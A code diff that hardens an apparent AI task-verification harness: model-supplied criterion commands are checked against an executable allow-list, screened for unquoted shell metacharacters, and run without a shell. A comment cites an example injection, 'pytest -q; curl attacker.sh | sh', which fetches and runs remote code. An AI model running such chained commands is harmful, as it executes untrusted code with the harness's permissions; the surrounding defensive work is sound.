@@ -46,6 +46,25 @@ _CODE_HINT = re.compile(
 )
 
 
+# Executables a criterion's command may name. A definition of done proves
+# something by running the project's own checks, so this list is deliberately
+# small: the command string is copied verbatim out of a model's JSON by
+# ``parse_dod``, which makes it untrusted input, and anything outside the list
+# is a request to run arbitrary code with the harness's own permissions.
+VERIFY_EXECUTABLES = frozenset({
+    "python", "python3", "py", "pytest", "tox", "coverage", "mypy", "ruff",
+    "flake8", "pylint", "black", "isort", "bandit",
+    "npm", "npx", "pnpm", "yarn", "node", "jest", "vitest", "eslint", "tsc",
+    "go", "cargo", "rustc", "dotnet", "mvn", "gradle", "make", "cmake", "ctest",
+    "rake", "rspec", "bundle", "phpunit", "swift",
+})
+
+# Characters that hand the rest of a command to a shell. They only matter
+# unquoted: ``python -c "print(1); raise SystemExit(1)"`` is a single argument,
+# while ``pytest -q; curl attacker.sh | sh`` is three commands.
+_METACHARACTERS = ";&|<>`$\n\r"
+
+
 @dataclass
 class CriterionIssue:
     criterion_id: str
@@ -171,10 +190,15 @@ def apply_quality_bars(
     if not touches_code(task):
         return []
 
+    # A bar is skipped only when the proposed criteria already cover it. Every
+    # alternative below is grouped so the \b anchors bind to the whole set: left
+    # ungrouped, only the first and last alternative are anchored and the rest
+    # match mid-word, so an innocent criterion naming an "author" or an
+    # "inspection" silently suppresses a mandatory bar.
     existing = " ".join(c.statement.lower() + " " + c.command.lower() for c in task.dod)
     added: list[DoDCriterion] = []
 
-    if policy.require_tests and not re.search(r"\btest|spec|coverage\b", existing):
+    if policy.require_tests and not re.search(r"\b(test|spec|coverage)\w*\b", existing):
         added.append(
             DoDCriterion(
                 statement=(
@@ -189,7 +213,9 @@ def apply_quality_bars(
         )
 
     if policy.require_security_review and not re.search(
-        r"\bsecurity|injection|auth|secret|validat|sanitis|sanitiz\b", existing
+        r"\b(security|injection|authn|authz|authentic|authoris|authoriz|secret"
+        r"|validat|sanitis|sanitiz)\w*\b",
+        existing,
     ):
         added.append(
             DoDCriterion(
@@ -207,7 +233,9 @@ def apply_quality_bars(
             )
         )
 
-    if policy.require_code_quality and not re.search(r"\blint|style|format|quality\b", existing):
+    if policy.require_code_quality and not re.search(
+        r"\b(lint|style|format|quality)\w*\b", existing
+    ):
         added.append(
             DoDCriterion(
                 statement=(
@@ -241,6 +269,67 @@ class VerificationOutcome:
     verified_by: str = "harness"
 
 
+def unquoted_metacharacter(command: str, characters: str = _METACHARACTERS) -> str | None:
+    """The first of ``characters`` outside quotes, or ``None`` if there is none.
+
+    Quoting is what separates ``python -c "a; b"`` -- one argument to one
+    program -- from ``a; b``, which is two commands. A token scan cannot tell
+    them apart after the fact, so the raw string is read here instead.
+
+    ``characters`` defaults to the metacharacters that chain or redirect a
+    command; :mod:`.tools` passes the glob characters instead, which are
+    dangerous for a different reason but need the same quote-aware scan.
+    """
+    quote = ""
+    for char in command:
+        if quote:
+            if char == quote:
+                quote = ""
+        elif char in "'\"":
+            quote = char
+        elif char in characters:
+            return char
+    return None
+
+
+def executable_name(token: str) -> str:
+    """The bare program name a command's first token invokes.
+
+    ``/usr/bin/python3``, ``C:\\Python\\python.EXE`` and ``python`` are the same
+    program, and an allow-list has to compare them as one.
+    """
+    return Path(token.replace("\\", "/")).name.lower().removesuffix(".exe")
+
+
+def unsafe_command(command: str) -> str | None:
+    """Why this command must not be run here, or ``None`` if it may be.
+
+    Criterion commands arrive as model output (``parse_dod``) and are run with
+    the harness's own permissions, so they are checked before use rather than
+    trusted: no shell, and only the project's own check runners.
+    """
+    tokens = shell_split(command)
+    if not tokens:
+        return "the command is empty once tokenised"
+
+    metacharacter = unquoted_metacharacter(command)
+    if metacharacter is not None:
+        return (
+            f"it contains the unquoted shell metacharacter {metacharacter!r}, and "
+            "criterion commands are run without a shell. Express each check as its "
+            "own criterion instead of chaining or redirecting them"
+        )
+
+    executable = executable_name(tokens[0])
+    if executable not in VERIFY_EXECUTABLES:
+        return (
+            f"{executable!r} is not one of the check runners a criterion may invoke "
+            f"({', '.join(sorted(VERIFY_EXECUTABLES))}). Verify this by review, or by "
+            "a command the user chooses to run themselves"
+        )
+    return None
+
+
 def verify_command(
     criterion: DoDCriterion,
     workspace: Path,
@@ -249,16 +338,25 @@ def verify_command(
     """Run a command criterion and judge it by exit code and expected output.
 
     Only reached when the caller has established that running commands here is
-    permitted; see :func:`verify_criterion`.
+    permitted; see :func:`verify_criterion`. The command is tokenised and run
+    without a shell, and refused outright unless :func:`unsafe_command` clears
+    it -- a criterion the harness will not run is blocked, and blocked is not
+    proven, so refusing here cannot certify anything.
     """
     command = criterion.command.strip()
     if not command:
         return VerificationOutcome(CriterionStatus.BLOCKED, "no command specified")
 
+    refusal = unsafe_command(command)
+    if refusal is not None:
+        return VerificationOutcome(
+            CriterionStatus.BLOCKED, f"refused to run {command!r}: {refusal}"
+        )
+
     try:
-        completed = subprocess.run(  # noqa: S602 - the command is the criterion
-            command,
-            shell=True,
+        completed = subprocess.run(  # noqa: S603 - tokenised, no shell, allow-listed
+            shell_split(command),
+            shell=False,
             cwd=str(workspace),
             capture_output=True,
             text=True,
@@ -380,7 +478,12 @@ def summarise(task: ExecutionTask) -> str:
 
 
 def shell_split(command: str) -> list[str]:
-    """Best-effort tokenisation, used for display rather than execution."""
+    """Best-effort tokenisation, used for display and for shell-free execution.
+
+    A command that :func:`unsafe_command` has cleared contains no unquoted
+    metacharacter, so this tokenisation is the whole of its meaning; the
+    fallback exists only so a malformed command can still be shown.
+    """
     try:
         return shlex.split(command)
     except ValueError:
